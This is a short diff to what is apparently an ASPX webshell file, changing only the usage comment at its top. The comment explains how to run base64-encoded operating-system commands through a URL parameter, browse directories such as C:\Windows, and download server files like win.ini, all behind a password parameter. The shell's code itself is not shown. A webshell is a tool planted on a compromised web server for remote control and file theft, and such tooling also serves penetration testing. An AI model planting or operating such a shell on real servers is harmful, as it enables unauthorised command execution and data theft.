@@ -1,7 +1,7 @@
 <%-- ASPX Webshell usage
-1. Execute command: http(s)://website/path/webshell.aspx?auth=PASSWORD&mode=exec&cmd=Y2QgLiAmJiBkaXI= (base64 for cd . && dir)
+1. Execute base64 encoded OS commands: http(s)://website/path/webshell.aspx?auth=PASSWORD&mode=exec&cmd=Y2QgLiAmJiBkaXI= (e.g., base64 for: cd . && dir)
 2. Browse directory: http(s)://website/path/webshell.aspx?auth=PASSWORD&mode=browse&path=C:\Windows
-3. Download file: Click on file link from browse mode Or use: http(s)://website/path/webshell.aspx?auth=PASSWORD&mode=download&file=C:\Windows\win.ini
+3. Download files: Click on a file link from the 'Browse directory' module or use: http(s)://website/path/webshell.aspx?auth=PASSWORD&mode=download&file=C:\Windows\win.ini
 --%>
 
 <%@ Page Language="C#" Debug="true" %>
@@ -82,3 +82,4 @@
         }
     }
 </script>
+
